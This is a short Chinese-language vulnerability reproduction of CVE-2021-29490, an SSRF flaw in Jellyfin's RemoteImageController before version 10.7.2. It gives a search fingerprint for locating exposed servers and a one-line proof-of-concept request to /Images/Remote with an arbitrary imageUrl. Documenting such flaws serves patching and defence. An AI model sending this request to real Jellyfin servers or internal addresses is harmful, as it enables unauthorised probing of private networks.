# Jellyfin RemoteImageController.cs SSRF漏洞 CVE-2021-29490

## 漏洞描述

Jellyfin RemoteImageController.cs 文件中存在SSRF漏洞，通过构造特殊的请求，探测内网信息

## 漏洞影响

<a-checkbox checked>Jellyfin < 10.7.2</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="Jellyfin"</a-checkbox></br>

## 漏洞复现

在官方的更新文件中，查找到修改的文件

![img](../../../.vuepress/public/img/1639026469087-918a2c7f-b015-4a28-a885-00f9a7267d75.png)

官方删除了某个方法

```go
function getDisplayUrl(url, apiClient) {
        return apiClient.getUrl('Images/Remote', { imageUrl: url });
    }
```

下载漏洞版本源码，查找该接口对应的文件 

`Jellyfin.Api/Controllers/RemoteImageController.cs`

![img](../../../.vuepress/public/img/1639026630565-84275017-5bbf-4835-8d2f-c7eaf1aff942.png)其中接收的参数为 imageUrl ，后续的代码片段存在SSRF漏洞	

![img](../../../.vuepress/public/img/1639026730098-5b7473f3-32b0-47ee-bb04-6f69c13202a0.png)

构造请求POC

```go
/Images/Remote?imageUrl=http://www.baidu.com
```

![img](../../../.vuepress/public/img/1639026826430-ef5e3b8a-d7cb-4957-a71d-b9af01c57c1b.png)